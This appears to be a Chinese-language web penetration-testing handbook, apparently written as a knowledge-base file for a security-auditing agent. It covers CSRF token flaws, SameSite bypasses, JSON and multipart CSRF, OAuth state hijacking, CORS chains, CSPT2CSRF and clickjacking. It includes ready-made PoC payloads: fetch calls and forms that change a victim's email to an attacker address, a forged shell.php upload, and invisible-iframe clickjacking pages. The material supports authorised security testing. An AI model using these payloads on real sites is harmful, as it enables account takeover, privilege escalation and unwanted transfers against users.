# CSRF 与 Clickjacking 攻击手册

> CSRF（跨站请求伪造）完整攻击面：token 缺陷 / SameSite 绕过 / JSON CSRF / OAuth state / CORS 组合链 / CSPT2CSRF。
> 加载时机: 审计状态变更端点（改密/改邮箱/转账/授权）、anti-CSRF 防御、SameSite 行为、OAuth 回调时。

## §1 成立条件与高价值目标

**成立四条件**（全部满足才可利用）:
1. 受害者已认证（活动会话 cookie）
2. 服务端仅靠 cookie 识别会话（无二次校验）
3. 攻击者可预测/构造出合法请求
4. cookie 会跨站发送（`SameSite=None` 或旧版浏览器行为）

**高价值状态变更端点**（按影响排序）:
改密码/改邮箱（账号接管）→ 添加管理员/改角色（提权）→ 转账（资金）→ OAuth 应用授权（劫持 OAuth 流）→ 删账号/关 2FA/加 SSH key/API key/webhook 配置/资料更新。

## §2 token 校验逻辑缺陷（三类）

| 缺陷 | 测试法 | 判定 |
|---|---|---|
| 无 token | 表单根本没有 CSRF token | 直接可利用 |
| token 未校验（**最常见**） | **整体删除 `_csrf_token` 参数**重发 | 请求仍成功 = 绕过 |
| token 换随机值 | 改成任意随机串重发 | 仍成功 = 未真正校验 |
| 绑会话不绑用户 | UserA 会话中用 UserB 的 token（攻击者自有账号的 token） | 仍成功 = 绕过 |

## §3 token 可预测 / 可获取 / fixation

**静态或可预测**:
- 所有用户/会话共用同一 token
- `token = base64(username)` / `md5(session_id)` → 可逆可推算
- `token = timestamp` → 可预测

**double-submit cookie 破坏**（子域可写 cookie 时）:
- 模式: 服务端 Set-Cookie `csrf=X`，要求请求头/表单带回同值（header == cookie 即通过）
- 破坏: 子域 XSS 或 cookie tossing 在 `.target.com` 写入 `csrf=CONTROLLED` → 提交 `X-CSRF-Token: CONTROLLED` → 匹配 → 绕过
- 前提: `*.target.com` 下存在可控子域（可写父域 cookie）

**token fixation**（认证前签发、登录后不轮换）:
1. 攻击者未登录访问 → 拿 token T1
2. cookie tossing（子域写 cookie）或 CRLF 注入把 T1 固定到受害者浏览器
3. 受害者登录 → token 不轮换仍是 T1
4. 用已知 T1 构造 PoC → 成功
- 测试: 未登录拿 token → 登录 → token 变了吗？不变 = fixation

## §4 SameSite=Lax 绕过五法

背景: Lax 是现代浏览器默认，cookie 仅随**顶层 GET 导航**跨站发送，跨站 iframe/form POST 不发送。

1. **GET 方法状态变更**: 服务端用 GET 做状态变更时——
   `<img src="https://target.com/account/delete?confirm=yes">` 或 `document.location='https://target.com/transfer?to=attacker&amount=1000'`
2. **子域 XSS**: SameSite 按 site（eTLD+1）判定，`sub.target.com` 的 XSS 对 target.com 是 same-site → cookie 照发，子域 XSS 作跳板
3. **Chrome Lax+POST 2 分钟豁免**: cookie 设置后 2 分钟内 Lax cookie 也随跨站 POST 发送（为 OAuth 设计）。利用: `window.open('https://target.com/login')` 强制设置新 cookie，5 秒后（setTimeout）提交跨站 POST 表单
4. **302 重定向链**: 攻击者页 302 到 `https://target.com/transfer?to=attacker&...` → 浏览器顶层导航跟随 → Lax cookie 发送 → GET 状态变更生效
5. **Method override 伪装 GET**: 框架支持方法覆盖时 GET 请求按 POST/DELETE 执行:
   - `GET /transfer?_method=POST&to=attacker&amount=1000`（Rails/Laravel/Symfony `_method` 参数）
   - `X-HTTP-Method-Override: POST` / `X-Method-Override: DELETE` 请求头
   - Lax 放行 GET → 框架按覆盖方法执行 → "仅 POST" 端点 CSRF 成立

`SameSite=None`（显式或旧浏览器）: cookie 处处发送 → 经典 CSRF 直接适用。

## §5 JSON CSRF 四法

背景: HTML form 只能发 `application/x-www-form-urlencoded` / `multipart/form-data` / `text/plain`，不能直接发 `application/json`。

**法1 CORS credentials**（需 CORS 错配，ACAO 反射 + ACAC: true）:
```javascript
fetch('https://target.com/api/v1/change-email', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({email:'attacker@evil.com'})
});
```

**法2 text/plain 表单伪装**（服务端不严格检查 Content-Type 时）:
```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
生成请求体: `{"email":"attacker@evil.com","ignore":"="}` —— 合法 JSON；input 的 name/value 中 `=` 被包进字符串无害化。

**法3 fetch no-cors + text/plain**:
```javascript
fetch('/api/role', {method:'POST', mode:'no-cors', credentials:'include',
  headers:{'Content-Type':'text/plain'}, body:'{"role":"admin"}'});
```
no-cors 不能设 `application/json`（触发 preflight），但 text/plain 是 simple request。

**法4 form-urlencoded 双解析**: 后端两种 Content-Type 语义等价（`role=admin&user_id=123` ≡ `{"role":"admin","user_id":123}`）→ 普通 HTML 表单直接 CSRF，无需 CORS。

另: Flash（2021 前）可跨域发任意 Content-Type 无需 preflight，仅老旧内部应用相关。

## §6 multipart CSRF 与 PoC 模板

**multipart**: JSON 端点改 `multipart/form-data` 仍工作 → 普通表单即可:
```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```
测试法: 对 JSON 端点逐个试 Content-Type 变更（json → form → text/plain → multipart），处理逻辑不变即存在 CSRF 面。

**文件上传端点 CSRF**:
```javascript
var fd = new FormData();
fd.append("file", new Blob(["malicious content"], {type:"text/plain"}), "shell.php");
fd.append("action", "upload");
fetch("https://target.com/upload", {method:"POST", credentials:"include", body:fd});
```

**PoC 基础模板**:
1. 自动提交: `<body onload="document.forms[0].submit()">` + POST 表单（免交互）
2. GET 型: `<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">`
3. XHR 带自定义头: 仅 CORS 错配时可用（withCredentials: true）

**CSRF+XSS 组合**（防护本身完好时）: XSS 从 DOM 读真实 token 再提交:
```javascript
var token = document.querySelector('input[name="csrf_token"]').value;
xhr.send('confirm=yes&csrf_token=' + token);
```

## §7 OAuth state 缺失 CSRF（账号绑定劫持）

1. 攻击者自己发起 OAuth 流程，走到授权码下发
2. 交换 code 前**停住**，截获回调 URL: `https://target.com/oauth/callback?code=ATTACKER_CODE`
3. 把该 URL 发给受害者点击
4. 受害者会话用攻击者的 code 完成绑定 → 受害者账号绑定攻击者的 OAuth 身份 → 攻击者可登录受害者账号

检测点: OAuth 授权/回调/账号绑定流程 state 缺失或未校验。登录 CSRF、账号绑定、callback 绑定均适用。

## §8 CSRF + CORS 组合链

**链1 反射 Origin + Credentials**（先读 token 再提交，绕过全部 CSRF 防御）:
```javascript
fetch('https://target.com/api/profile', {credentials:'include'})
  .then(r=>r.json()).then(data => {
    fetch('https://target.com/api/change-email', {method:'POST', credentials:'include',
      headers:{'Content-Type':'application/json','X-CSRF-Token':data.csrf_token},
      body: JSON.stringify({email:'attacker@evil.com'})});
  });
```

**链2 子域 XSS → CORS → CSRF**: `*.target.com` 在 CORS 白名单 + 任一子域 XSS:
blog.target.com 触发 XSS → 从 XSS 上下文 fetch api.target.com（CORS 允许）→ 读出 token → 带合法 token 提交。

要点: API 要求自定义头（X-CSRF-Token）本身**不构成** CSRF 防护——CORS 错配时自定义头反而成为攻击通道。

## §9 CSPT2CSRF（客户端路径遍历转 CSRF）

前端 JS 把用户输入拼进请求路径 → 路径遍历改写实际请求目标:
```
正常: fetch /api/user/PROFILE_ID/settings
攻击: PROFILE_ID = ../../admin/dangerous-action
结果: fetch 命中 /api/admin/dangerous-action（受害者凭证自动带）
```

| 维度 | 传统 CSRF | CSPT2CSRF |
|---|---|---|
| 请求来源 | 攻击者站点 | 同源 JavaScript |
| token | 需伪造/窃取 | 不需要（同源自动带） |
| SameSite | 被 Strict/Lax 阻断 | 不受影响（same-site） |
| 防御 | 标准 CSRF 检查 | 路径段输入校验 |

漏洞点: SPA 中把 URL 参数/查询参数拼进 fetch 路径的位置（如 `/user?userId=` 之后 JS 用 userId 拼路径）。缓存欺骗视角的组合利用见 `$AGENT_DIR/knowledge-base/cache-poisoning.md`。

## §10 测试 checklist（按序逐项）

```
□ 整体删除 CSRF token 参数 → 仍成功？
□ token 换随机值 → 仍成功？
□ 用另一用户会话的 token → 仍成功？
□ POST 端点是否有 GET 版本（method override/参数变体）？
□ 会话 cookie 的 SameSite 属性？
□ Content-Type 变更: json → form → text/plain → multipart，逻辑是否不变？
□ CORS: ACAC: true + 反射/通配 Origin？→ JSON CSRF 可利用
□ OAuth 流程 state 缺失/未校验？
□ Referer 校验型: 发无 Referer 的请求（Referrer-Policy: no-referrer / meta refresh 中转）
□ Referer 校验型: 伪造 Referer 子域（target.com.attacker.com）
```

高优先组合: 改密/改邮箱 + token 缺陷 = 账号接管；权限变更端点 + SameSite 绕过 = 提权。

## §11 Clickjacking（点击劫持/UI redress）

**原理**: 目标页加载进透明 iframe 覆盖在攻击者页面之上，受害者看到攻击者 UI 但点击落在不可见目标页上，触发非预期操作。CSRF 防护完好但页面可框架时的替代攻击路径——点击源自目标 origin 内（iframe 中），绕过全部 CSRF token。

### 可框架化判定

| 防护 | 值 | 效果 |
|---|---|---|
| X-Frame-Options | `DENY` | 不可框架（安全） |
| X-Frame-Options | `SAMEORIGIN` | 仅同源可框架 |
| X-Frame-Options | `ALLOW-FROM uri` | 已废弃，Chrome/Safari 不支持——仅依赖它 = 可框架 |
| CSP frame-ancestors | `'none'` / `'self'` / 指定源 | 不可框架/仅同源/仅指定源 |
| 两者都缺 | — | 可框架（漏洞） |

优先级: **CSP frame-ancestors 覆盖 X-Frame-Options**（现代浏览器），两个都查。
快速 PoC: `<iframe src="https://target.com/sensitive-action" width="800" height="600"></iframe>` 能加载即漏洞。

### PoC 模板

基础单击:
```html
<style>
  iframe { position: absolute; top: 300px; left: 60px;
           width: 500px; height: 200px; opacity: 0.0001; z-index: 2; }
  .decoy { position: absolute; z-index: 1; }
</style>
<div class="decoy"><button>Click to win!</button></div>
<iframe src="https://target.com/account/settings?action=delete"></iframe>
```
要点: `opacity: 0.0001`（非 0）、诱饵坐标对齐 iframe 内真实按钮。

多步点击（有"Are you sure?"确认时）: step1 点击后 display 切换到 step2，**每步重新定位 iframe** 对齐当步透明按钮。

拖放型: HTML5 拖放事件跨不可见 iframe 提取数据——受害者拖动元素划过透明 iframe 时把 token/数据从一个 iframe 传到另一个，适合需输入框填充敏感值的场景。

### 绕过三法

1. **sandbox 绕 frame-busting**: 目标页 `if (top !== self) { top.location = self.location; }` → `<iframe src="https://target.com" sandbox="allow-forms allow-scripts"></iframe>`（无 `allow-top-navigation` 时 JS 无法导航顶层，frame-busting 失效且表单/脚本仍工作）
2. **ALLOW-FROM 失效**: 仅靠 `ALLOW-FROM` 防护时现代浏览器忽略 → 可框架
3. **双重框架绕 SAMEORIGIN**: 找目标域上任意无 XFO 的页面（旧页面/错误页/静态页）作中间层，外层框架中间页、中间页框架目标 → 对目标框架者同源 → 放行

### 高价值目标

删账号页 / 改邮箱改密码 / 管理员操作（加用户、改角色）/ 支付确认 / OAuth 授权 Allow 按钮 / 关 2FA / API key 生成 / webhook 配置。低严重度打在管理员操作上即成 critical。认证与非认证页面都要测。

## §12 关联文件

- `$AGENT_DIR/knowledge-base/web-vulnerabilities.md` — §2.4 速查指针、Cookie 安全（SameSite 属性表）
- `$AGENT_DIR/knowledge-base/cache-poisoning.md` — CSPT 缓存欺骗组合链
- `$AGENT_DIR/knowledge-base/csp-bypass.md` — frame-ancestors 相关 CSP 绕过
